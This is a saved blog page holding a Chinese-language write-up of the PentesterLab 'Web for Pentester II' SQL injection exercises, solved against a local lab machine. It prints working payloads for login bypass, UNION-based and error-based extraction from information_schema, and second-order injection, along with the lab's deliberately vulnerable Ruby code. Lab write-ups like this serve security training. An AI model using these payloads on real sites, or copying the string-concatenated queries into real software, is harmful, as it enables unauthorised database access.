<!DOCTYPE html>

<html lang="zh-Hans">
<head>
<!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->
<meta charset="utf-8"/>
<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<meta content="telephone=no" name="format-detection">
<meta content="LoRexxar" name="author"/>
<meta content="听说新出了web for pentest2，正好没什么事，那就来做做看吧…" name="description"/>
<meta content="article" property="og:type"/>
<meta content="web_for_pentest_II writeup" property="og:title"/>
<meta content="http://lorexxar.cn/2016/03/30/web-for-pentest-II/index.html" property="og:url"/>
<meta content="LoRexxar's Blog" property="og:site_name"/>
<meta content="听说新出了web for pentest2，正好没什么事，那就来做做看吧…" property="og:description"/>
<meta content="https://pentesterlab.com/exercises/web_for_pentester_II/course" property="og:image"/>
<meta content="2016-04-02T12:19:12.000Z" property="og:updated_time"/>
<meta content="summary" name="twitter:card"/>
<meta content="web_for_pentest_II writeup" name="twitter:title"/>
<meta content="听说新出了web for pentest2，正好没什么事，那就来做做看吧…" name="twitter:description"/>
<meta content="https://pentesterlab.com/exercises/web_for_pentester_II/course" name="twitter:image"/>
<link href="./web_for_pentest_II writeup  LoRexxar's Blog/apple-touch-icon.png" rel="apple-touch-icon"/>
<link href="./web_for_pentest_II writeup  LoRexxar's Blog/atom.xml" rel="alternate" title="LoRexxar's Blog" type="application/atom+xml"/>
<link href="./web_for_pentest_II writeup  LoRexxar's Blog/699-14040QPP9.jpg" rel="shortcut icon"/>
<link href="./web_for_pentest_II writeup  LoRexxar's Blog/jquery.fancybox.min.css" rel="stylesheet"/>
<script src="./web_for_pentest_II writeup  LoRexxar's Blog/pace.min.js"></script>
<link href="./web_for_pentest_II writeup  LoRexxar's Blog/pace-theme-minimal.css" rel="stylesheet"/>
<link href="./web_for_pentest_II writeup  LoRexxar's Blog/style.css" rel="stylesheet"/>
<link href="./web_for_pentest_II writeup  LoRexxar's Blog/font-awesome.min.css" rel="stylesheet"/>
<title>web_for_pentest_II writeup | LoRexxar's Blog</title>
<script src="./web_for_pentest_II writeup  LoRexxar's Blog/jquery.min.js"></script>
<script src="./web_for_pentest_II writeup  LoRexxar's Blog/clipboard.min.js"></script>
<script>
    var yiliaConfig = {
        fancybox: true,
        animate: false,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>
<script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>
<script> yiliaConfig.rootUrl = "\/";</script>
<script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
</meta></meta></head>
<body>
<div id="container">
<div class="left-col">
<div class="overlay"></div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="animated zoomIn" src="./web_for_pentest_II writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/">LoRexxar</a></h1>
</hgroup>
<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
<form id="search-form">
<input autocomplete="off" autocorrect="off" class="search form-control" id="local-search-input" name="q" placeholder="search..." searchonload="false" type="text"/>
<i class="fa fa-times" onclick="resetSearch()"></i>
</form>
<div id="local-search-result"></div>
<p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
<div class="switch-btn" id="switch-btn">
<div class="icon">
<div class="icon-ctn">
<div class="icon-wrap icon-house" data-idx="0">
<div class="birdhouse"></div>
<div class="birdhouse_holes"></div>
</div>
<div class="icon-wrap icon-ribbon hide" data-idx="1">
<div class="ribbon"></div>
</div>
<div class="icon-wrap icon-link hide" data-idx="2">
<div class="loopback_l"></div>
<div class="loopback_r"></div>
</div>
<div class="icon-wrap icon-me hide" data-idx="3">
<div class="user"></div>
<div class="shoulder"></div>
</div>
</div>
</div>
<div class="tips-box hide">
<div class="tips-arrow"></div>
<ul class="tips-inner">
<li>菜单</li>
<li>标签</li>
<li>友情链接</li>
<li>关于我</li>
</ul>
</div>
</div>
<div class="switch-area" id="switch-area">
<div class="switch-wrap">
<section class="switch-part switch-part1">
<nav class="header-menu">
<ul>
<li><a href="/">主页</a></li>
<li><a href="/archives/">所有文章</a></li>
<li><a href="/tags/">标签云</a></li>
<li><a href="/about/">关于我</a></li>
</ul>
</nav>
<nav class="header-nav">
<ul class="social">
<a class="fa Email" href="/lorexxar@gmail.com" title="Email"></a>
<a class="fa 新浪微博" href="/强行被换号的LoRexxar" title="新浪微博"></a>
<a class="fa GitHub" href="https://github.com/LoRexxar" title="GitHub"></a>
<a class="fa RSS" href="/atom.xml" title="RSS"></a>
<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" title="知乎"></a>
</ul>
</nav>
</section>
<section class="switch-part switch-part2">
<div class="widget tagcloud" id="js-tagcloud">
<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CBC/">CBC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essay/">Essay</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essry/">Essry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC通道入侵/">IPC通道入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LD-PRELOAD/">LD_PRELOAD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reprint/">Reprint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shadow-Brokers/">Shadow Brokers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book-notes/">book_notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bookshelf/">bookshelf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cloudeye/">cloudeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmd/">cmd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crontab/">crontab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csp/">csp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns/">dns</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eassy/">eassy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastcgi/">fastcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fcgi/">fcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file-put-contents/">file_put_contents</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gopher/">gopher</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hctf/">hctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/injection/">injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lcx端口转发/">lcx端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lfi/">lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opcache/">opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pdflatex/">pdflatex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-opcache/">php opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpmailer/">phpmailer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php伪协议/">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnhub/">pwnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rabins/">rabins</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sangebaimao/">sangebaimao</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-sock5/">ssh_sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/titan-souls/">titan_souls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tqdm/">tqdm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenv/">virtualenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/">weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/win-server信息收集/">win server信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪协议/">伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/参数污染/">参数污染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式化字符串/">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板注入/">模板注入</a></li></ul>
</div>
</section>
<section class="switch-part switch-part3">
<div id="js-friends">
<a class="main-nav-link switch-friends-link" href="https://coding.net/u/LoRexxar">Coding</a>
<a class="main-nav-link switch-friends-link" href="https://github.com/LoRexxar">GitHub</a>
<a class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
<a class="main-nav-link switch-friends-link" href="https://wiki.hduisa.cn">HDUISA_wiki</a>
<a class="main-nav-link switch-friends-link" href="https://lightless.me/">lightless</a>
<a class="main-nav-link switch-friends-link" href="http://lazysheep.cc">Hcamael</a>
<a class="main-nav-link switch-friends-link" href="http://aklis.info/">Aklis</a>
<a class="main-nav-link switch-friends-link" href="http://libc.pw/">zh_explorer</a>
<a class="main-nav-link switch-friends-link" href="http://edwardl.xyz/">Edward_L</a>
<a class="main-nav-link switch-friends-link" href="http://evilddog.space/">evilddog</a>
<a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
<a class="main-nav-link switch-friends-link" href="http://www.nohackair.net/">Airbasic</a>
<a class="main-nav-link switch-friends-link" href="https://loli.be/">Mashiro</a>
<a class="main-nav-link switch-friends-link" href="http://www.codersec.net/">bsmali4</a>
<a class="main-nav-link switch-friends-link" href="/www.bertramc.cn">berTrAM</a>
</div>
</section>
<section class="switch-part switch-part4">
<div id="js-aboutme">带着对技术的敬畏之心成长，不安于一隅...</div>
</section>
</div>
</div>
</header>
</div>
</div>
<div class="mid-col">
<nav id="mobile-nav">
<div class="overlay">
<div class="slider-trigger"></div>
<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LoRexxar</a></h1>
</div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="animated zoomIn" src="./web_for_pentest_II writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/" title="回到主页">LoRexxar</a></h1>
</hgroup>
<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
<nav class="header-menu">
<ul>
<li><a href="/">主页</a></li>
<li><a href="/archives/">所有文章</a></li>
<li><a href="/tags/">标签云</a></li>
<li><a href="/about/">关于我</a></li>
<div class="clearfix"></div>
</ul>
</nav>
<nav class="header-nav">
<ul class="social">
<a class="fa Email" href="/lorexxar@gmail.com" target="_blank" title="Email"></a>
<a class="fa 新浪微博" href="/强行被换号的LoRexxar" target="_blank" title="新浪微博"></a>
<a class="fa GitHub" href="https://github.com/LoRexxar" target="_blank" title="GitHub"></a>
<a class="fa RSS" href="/atom.xml" target="_blank" title="RSS"></a>
<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" target="_blank" title="知乎"></a>
</ul>
</nav>
</header>
</div>
<link about="关于我" class="menu-list" friends="友情链接" tags="标签">
</link></nav>
<div class="body-wrap"><article class="article article-type-post" id="post-web-for-pentest-II" itemprop="blogPost" itemscope="">
<div class="article-meta">
<a class="article-date" href="/2016/03/30/web-for-pentest-II/">
<time datetime="2016-03-30T02:52:08.000Z" itemprop="datePublished">2016-03-30</time>
</a>
</div>
<div class="article-inner">
<input class="isFancy" type="hidden"/>
<header class="article-header">
<h1 class="article-title" itemprop="name">
      web_for_pentest_II writeup
    </h1>
</header>
<div class="article-info article-info-post">
<div class="article-category tagcloud">
<a class="article-category-link" href="/categories/Blogs/">Blogs</a>
</div>
<div class="article-tag tagcloud">
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
</div>
<div class="clearfix"></div>
</div>
<div class="article-entry" itemprop="articleBody">
<p>听说新出了web for pentest2，正好没什么事，那就来做做看吧…</p>
<a id="more"></a>
<h1 id="SQL-injections"><a class="headerlink" href="#SQL-injections" title="SQL injections"></a>SQL injections</h1><h2 id="example1"><a class="headerlink" href="#example1" title="example1"></a>example1</h2><p>打开看到是一个登陆框，猜测是没有过滤，那么先输入个单引号吧，看看有没有什么过滤。<br/>看到回显<br/><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Mysql2::Error: You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''''</span> <span class="keyword">AND</span> <span class="keyword">password</span>=<span class="string">''' at line 1: SELECT * FROM users WHERE username='''</span> <span class="keyword">AND</span> <span class="keyword">password</span>=<span class="string">''</span></div></pre></td></tr></table></figure></p>
<p>那么登陆吧，不知道为什么username处永真无效…<br/><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">username</span>=admin&amp;password=<span class="number">123</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>想看看后台是怎么写的，结果发现全部都是rubyweb实现…</p>
<h2 id="example2"><a class="headerlink" href="#example2" title="example2"></a>example2</h2><p>居然又是个登陆框，而且好像没什么过滤，就是过不了，一脸懵比，去看了后台源码发现需要只查出来一条数据，那么简单<br/>payload:<br/><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=admin&amp;password=<span class="number">123</span>'or+<span class="number">1</span>+limit+<span class="number">1</span>#</div></pre></td></tr></table></figure></p>
<h2 id="example3"><a class="headerlink" href="#example3" title="example3"></a>example3</h2><p>一脸懵比，居然又是登陆框，稍微测试了下发现单引号被过滤了，那么想想有查询两个字段，那么可以用反斜杠<br/><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=\<span class="variable">&amp;password</span>=||<span class="number">1</span><span class="meta">#</span></div></pre></td></tr></table></figure></p>
<p>这样可以转义掉本来包括username的单引号，username会包括&amp;password=，然后构造就可以过了</p>
<h2 id="example4"><a class="headerlink" href="#example4" title="example4"></a>example4</h2><p>这回终于是个查询了，打开发现是这样的<br/><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?req=username=<span class="string">'hacke'</span></div></pre></td></tr></table></figure></p>
<p>那么构造句测试下发现并没有过滤，那么开始注吧<br/><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">req=username=<span class="string">'hacke'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">version</span>(),<span class="title">user</span>(),3</span></div></pre></td></tr></table></figure></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">id</span>	<span class="selector-tag">name</span></div><div class="line">5<span class="selector-class">.1</span><span class="selector-class">.66-0</span>+<span class="selector-tag">squeeze1</span>	<span class="selector-tag">pentesterlab</span>@<span class="keyword">localhost</span></div></pre></td></tr></table></figure>
<p>顺便找到表名sqlinjection_example4<br/>看看表里的列名<br/><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">req=username=<span class="string">'hacke'</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'sqlinjection_example4'</span></div></pre></td></tr></table></figure></p>
<p>然而只有<code>users</code><br/>里面啥也没有<br/><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">id	name</div><div class="line"><span class="number">1</span>	user1</div><div class="line"><span class="number">2</span>	user2</div><div class="line"><span class="number">3</span>	user3</div><div class="line"><span class="number">4</span>	user4</div><div class="line"><span class="number">5</span>	hacker</div></pre></td></tr></table></figure></p>
<h2 id="example-5"><a class="headerlink" href="#example-5" title="example 5"></a>example 5</h2><p>这回是在limit后面，稍微测试了下发现啥都没过滤，说明上面的payload可以直接拿过来用，数据库权限比较大，所有题目都能看到<br/><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?limit=<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'sqlinjection_example5'</span></div></pre></td></tr></table></figure></p>
<p>没什么可说的</p>
<h2 id="example6"><a class="headerlink" href="#example6" title="example6"></a>example6</h2><p>这次在group by后面，看是还是没有任何过滤，所有payload还是不变。。。<br/><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">group</span>=id <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'sqlinjection_example6'</span></div></pre></td></tr></table></figure></p>
<h2 id="example7"><a class="headerlink" href="#example7" title="example7"></a>example7</h2><p>一脸懵比，回显想不明白，而且一定要查询出来user才行，不然会报错<br/><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.157.129/sqlinjection</span><span class="regexp">/example7/</span>?id=<span class="number">47</span></div><div class="line"></div><div class="line">Should only <span class="keyword">return</span> one user...</div></pre></td></tr></table></figure></p>
<p>说明不是正常的注入了，发现显错没关，那试试显错注入吧。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=12+and+1=2+UNION+<span class="keyword">SELECT</span>+<span class="number">1</span>+<span class="keyword">FROM</span>+(<span class="keyword">select</span>+<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span>+<span class="keyword">concat</span>(<span class="number">0x5f</span>,<span class="keyword">database</span>(),<span class="number">0x5f</span>,<span class="keyword">user</span>(),<span class="number">0x5f</span>,<span class="keyword">version</span>())))a+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">group</span>+<span class="keyword">by</span>+a)b<span class="comment">--</span></div></pre></td></tr></table></figure>
<p>这个是之前研究时候用的显错注入的payload，拖过来发现可以直接用。</p>
<p><a href="http://lorexxar.cn/2015/11/19/sql-error/#more">http://lorexxar.cn/2015/11/19/sql-error/#more</a><br/><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Mysql2::Error: Duplicate entry '1_sqlinjection_example6_pentesterlab@localhost_5.1.66-0+squeeze1' for key 'group_key': <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">12</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="number">0x5f</span>,<span class="keyword">database</span>(),<span class="number">0x5f</span>,<span class="keyword">user</span>(),<span class="number">0x5f</span>,<span class="keyword">version</span>())))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)b<span class="comment">--</span></div></pre></td></tr></table></figure></p>
<p>一目了然</p>
<h2 id="example8"><a class="headerlink" href="#example8" title="example8"></a>example8</h2><p>打开爆了500，这回真的是一脸懵比，赶快去看看源码<br/><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">get <span class="string">"/users/:id"</span> <span class="keyword">do</span></div><div class="line">    ActiveRecord::Base.establish_connection SQLInjectionExample8.db</div><div class="line">    @user = User.find(params[<span class="symbol">:id</span>])</div><div class="line">    <span class="keyword">if</span> @user    </div><div class="line">      <span class="keyword">begin</span> </div><div class="line">        sql = <span class="string">"SELECT * FROM users WHERE username='<span class="subst">#{@user.username}</span>' "</span></div><div class="line">        @res = ActiveRecord::Base.connection.execute(sql).to_a[<span class="number">0</span>]</div><div class="line">        erb <span class="symbol">:user</span></div><div class="line">      <span class="keyword">rescue</span> Exception =&gt; e</div><div class="line">        @message = e.to_s</div><div class="line">      <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span>  </div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line">  post <span class="string">'/user'</span> <span class="keyword">do</span></div><div class="line">    User.create(<span class="symbol">:username</span> =&gt; params[<span class="symbol">:user</span>], <span class="symbol">:password</span> =&gt; Digest::MD5.hexdigest(SEED+params[<span class="string">"password"</span>]+SEED))</div><div class="line">    redirect SQLInjectionExample8.path</div><div class="line">  <span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>完全看不懂，所以贴上官网的解释<br/><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">This example is vulnerable <span class="built_in">to</span> <span class="string">"second order SQL injection"</span>, instead <span class="keyword">of</span> directly injecting your payload <span class="keyword">in</span> <span class="keyword">the</span> request, you will <span class="keyword">first</span> insert <span class="keyword">it</span> <span class="keyword">in</span> <span class="keyword">the</span> database <span class="keyword">using</span> <span class="keyword">a</span> <span class="keyword">first</span> request <span class="keyword">and</span> <span class="keyword">then</span> trigger <span class="keyword">the</span> payload <span class="keyword">in</span> <span class="keyword">a</span> <span class="keyword">second</span> request. The <span class="keyword">first</span> request is <span class="keyword">not</span> vulnerable <span class="built_in">to</span> SQL injection, only <span class="keyword">the</span> <span class="keyword">second</span> is. However, you <span class="built_in">do</span> <span class="keyword">not</span> directly control <span class="keyword">the</span> <span class="built_in">value</span> used, you need <span class="built_in">to</span> inject <span class="keyword">it</span> <span class="keyword">using</span> <span class="keyword">the</span> <span class="keyword">first</span> request. This issue comes <span class="built_in">from</span> <span class="keyword">the</span> fact that <span class="keyword">the</span> developer trusted <span class="keyword">the</span> values coming <span class="built_in">from</span> <span class="keyword">the</span> database.</div><div class="line"></div><div class="line">Each attempt will need <span class="literal">two</span> steps:</div><div class="line"></div><div class="line">Create <span class="keyword">a</span> user <span class="keyword">with</span> your payload.</div><div class="line">Access this user information <span class="built_in">to</span> trigger your payload.</div><div class="line">If you want <span class="built_in">to</span> be efficient you need <span class="built_in">to</span> automate this <span class="built_in">process</span> <span class="keyword">using</span> <span class="keyword">a</span> simple script. The payload can be <span class="keyword">as</span> simple <span class="keyword">as</span> <span class="keyword">a</span> <span class="built_in">union</span>-based exploitation.</div></pre></td></tr></table></figure></p>
<p>搜到一个payload但是我的本地过不了<br/><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://<span class="number">192.168</span>.<span class="number">5.40</span>/sqlinjection/example8/</div><div class="line">creat <span class="keyword">user</span> <span class="title">name</span>:xxxx' union select <span class="number">188</span>,<span class="number">9999</span> ,<span class="number">7777</span><span class="comment">#</span></div><div class="line">visite user</div></pre></td></tr></table></figure></p>
<h2 id="example9"><a class="headerlink" href="#example9" title="example9"></a>example9</h2><p>稍微测试了下没什么发现，错误显示也关了，那去看看后台吧<br/><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">get <span class="string">'/'</span> <span class="keyword">do</span></div><div class="line">    ActiveRecord::Base.establish_connection SQLInjectionExample9.db</div><div class="line">    res = []</div><div class="line">    <span class="keyword">if</span> params[<span class="string">'username'</span>] &amp;&amp; params[<span class="string">'password'</span>] </div><div class="line">      <span class="keyword">begin</span></div><div class="line">        sql= <span class="string">"SET CHARACTER SET 'GBK';"</span> </div><div class="line">        ActiveRecord::Base.connection.execute(sql)</div><div class="line">        name = ActiveRecord::Base.connection.quote_string(params[<span class="symbol">:username</span>])</div><div class="line">        password = Digest::MD5.hexdigest(SEED+ActiveRecord::Base.connection.quote_string(params[<span class="symbol">:password</span>]+SEED))</div><div class="line">        sql = <span class="string">"SELECT * FROM users WHERE username='<span class="subst">#{name}</span>'"</span></div><div class="line">        sql+= <span class="string">" AND password='"</span>+password+<span class="string">"'"</span></div><div class="line">        res = ActiveRecord::Base.connection.execute(sql).to_a</div><div class="line">      <span class="keyword">rescue</span> Exception =&gt; e</div><div class="line">        @message = e.to_s </div><div class="line">      <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    pp res</div><div class="line">    <span class="keyword">if</span> res.size &gt; <span class="number">0</span></div><div class="line">      erb <span class="symbol">:index</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      erb <span class="symbol">:login</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div></pre></td></tr></table></figure></p>
